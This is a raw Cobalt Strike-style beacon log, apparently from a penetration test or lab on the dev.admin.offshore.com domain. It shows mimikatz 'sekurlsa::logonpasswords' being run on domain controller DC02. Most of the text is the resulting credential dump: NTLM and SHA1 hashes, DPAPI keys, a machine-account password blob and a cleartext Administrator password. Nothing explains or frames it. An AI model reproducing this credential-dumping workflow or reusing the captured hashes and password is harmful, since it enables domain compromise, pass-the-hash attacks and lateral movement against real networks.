
```powershell
[01/26 14:01:26] beacon> mimikatz !sekurlsa::logonpasswords
[01/26 14:01:26] [*] Tasked beacon to run mimikatz's !sekurlsa::logonpasswords command
[01/26 14:01:31] beacon> sleep 0
[01/26 14:01:31] [*] Tasked beacon to become interactive
[01/26 14:01:40] [+] host called home, sent: 815452 bytes
[01/26 14:01:41] [+] received output:

Authentication Id : 0 ; 15227674 (00000000:00e85b1a)
Session           : Batch from 0
User Name         : Administrator
Domain            : DEV
Logon Server      : DC02
Logon Time        : 1/26/2024 1:59:42 PM
SID               : S-1-5-21-1416445593-394318334-2645530166-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : DEV
	 * NTLM     : c61f43b6a4db2676714713836b7d2ea6
	 * SHA1     : 6b7ecac22f74a742dab682567a90d769a260148f
	 * DPAPI    : 8b5a7fdea66c06955058f5bc0958f0d6
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : DEV
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : dev.ADMIN.OFFSHORE.COM
	 * Password : Rain train plane dev$$$
	ssp :	
	credman :	

Authentication Id : 0 ; 2858730 (00000000:002b9eea)
Session           : NewCredentials from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/25/2024 2:12:47 PM
SID               : S-1-5-18
	msv :	
	 [00000003] Primary
	 * Username : ws04$
	 * Domain   : admin.offshore.com
	 * NTLM     : 2abf50d13b5e08b92ac2d90c1d125b99
	tspkg :	
	wdigest :	
	 * Username : ws04$
	 * Domain   : admin.offshore.com
	 * Password : (null)
	kerberos :	
	 * Username : ws04$
	 * Domain   : ADMIN.OFFSHORE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 68869 (00000000:00010d05)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/25/2024 11:16:58 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : DC02$
	 * Domain   : DEV
	 * NTLM     : 1a1d4bd303de23a5ca0e13cda66be2e3
	 * SHA1     : f646f4be49b3addc8938874344cd434f5e0b7cef
	tspkg :	
	wdigest :	
	 * Username : DC02$
	 * Domain   : DEV
	 * Password : (null)
	kerberos :	
	 * Username : DC02$
	 * Domain   : dev.ADMIN.OFFSHORE.COM
	 * Password : bf 06 7a b5 05 85 ab f0 bf 47 08 3d a4 c3 46 50 73 bc fa 91 e8 f8 2b 07 18 ab 51 3c 1f 99 1d ee b0 ee 3c 0a 5e 34 3b 74 37 7c 8f 5e 86 5e 14 82 62 83 7b e9 bf c9 ed 00 e2 f9 90 ff 98 42 a8 82 a1 ab 2c f2 ce 7b e4 ac c4 fc ca e3 60 2d ea 56 ca b8 d3 50 8e a8 5b ab d5 9e b7 6f b6 f5 60 b0 02 41 2e 4f 57 cd 78 68 ee 9f 2b 34 45 73 06 36 bd 8b bd 21 f5 b1 81 37 90 b5 d5 44 4e e4 45 56 35 57 d6 53 3a 1a 42 7e 14 c1 9f 3a 0c f2 f2 ba 34 86 ec a1 e1 b2 2f 7a 79 b3 cf 93 c5 b5 db 8c c4 3b 08 59 21 3d 2e a8 c3 b0 6e 60 5c 8f cd 38 13 eb 85 28 f3 32 01 59 95 19 e2 4b 00 3c 09 64 8c e0 77 6c d8 02 21 35 8c 50 b1 7f 06 6d fe 14 e3 11 e6 01 5d c8 49 e6 7b e0 8e 90 25 c7 c9 c4 5c 76 b0 4c 70 60 87 7a 5f 55 d7 c0 5e 12 35 25 
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC02$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 1/25/2024 11:16:58 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : DC02$
	 * Domain   : DEV
	 * NTLM     : 1a1d4bd303de23a5ca0e13cda66be2e3
	 * SHA1     : f646f4be49b3addc8938874344cd434f5e0b7cef
	tspkg :	
	wdigest :	
	 * Username : DC02$
	 * Domain   : DEV
	 * Password : (null)
	kerberos :	
	 * Username : dc02$
	 * Domain   : DEV.ADMIN.OFFSHORE.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 37447 (00000000:00009247)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/25/2024 11:16:55 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : DC02$
	 * Domain   : DEV
	 * NTLM     : 1a1d4bd303de23a5ca0e13cda66be2e3
	 * SHA1     : f646f4be49b3addc8938874344cd434f5e0b7cef
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 15220637 (00000000:00e83f9d)
Session           : Batch from 0
User Name         : Administrator
Domain            : DEV
Logon Server      : DC02
Logon Time        : 1/26/2024 1:59:41 PM
SID               : S-1-5-21-1416445593-394318334-2645530166-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : DEV
	 * NTLM     : c61f43b6a4db2676714713836b7d2ea6
	 * SHA1     : 6b7ecac22f74a742dab682567a90d769a260148f
	 * DPAPI    : 8b5a7fdea66c06955058f5bc0958f0d6
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : DEV
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : dev.ADMIN.OFFSHORE.COM
	 * Password : Rain train plane dev$$$
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/25/2024 11:16:58 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 68835 (00000000:00010ce3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/25/2024 11:16:58 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : DC02$
	 * Domain   : DEV
	 * NTLM     : 1a1d4bd303de23a5ca0e13cda66be2e3
	 * SHA1     : f646f4be49b3addc8938874344cd434f5e0b7cef
	tspkg :	
	wdigest :	
	 * Username : DC02$
	 * Domain   : DEV
	 * Password : (null)
	kerberos :	
	 * Username : DC02$
	 * Domain   : dev.ADMIN.OFFSHORE.COM
	 * Password : bf 06 7a b5 05 85 ab f0 bf 47 08 3d a4 c3 46 50 73 bc fa 91 e8 f8 2b 07 18 ab 51 3c 1f 99 1d ee b0 ee 3c 0a 5e 34 3b 74 37 7c 8f 5e 86 5e 14 82 62 83 7b e9 bf c9 ed 00 e2 f9 90 ff 98 42 a8 82 a1 ab 2c f2 ce 7b e4 ac c4 fc ca e3 60 2d ea 56 ca b8 d3 50 8e a8 5b ab d5 9e b7 6f b6 f5 60 b0 02 41 2e 4f 57 cd 78 68 ee 9f 2b 34 45 73 06 36 bd 8b bd 21 f5 b1 81 37 90 b5 d5 44 4e e4 45 56 35 57 d6 53 3a 1a 42 7e 14 c1 9f 3a 0c f2 f2 ba 34 86 ec a1 e1 b2 2f 7a 79 b3 cf 93 c5 b5 db 8c c4 3b 08 59 21 3d 2e a8 c3 b0 6e 60 5c 8f cd 38 13 eb 85 28 f3 32 01 59 95 19 e2 4b 00 3c 09 64 8c e0 77 6c d8 02 21 35 8c 50 b1 7f 06 6d fe 14 e3 11 e6 01 5d c8 49 e6 7b e0 8e 90 25 c7 c9 c4 5c 76 b0 4c 70 60 87 7a 5f 55 d7 c0 5e 12 35 25 
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DC02$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 1/25/2024 11:16:55 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : DC02$
	 * Domain   : DEV
	 * Password : (null)
	kerberos :	
	 * Username : DC02$
	 * Domain   : dev.admin.offshore.com
	 * Password : (null)
	ssp :	
	credman :	

```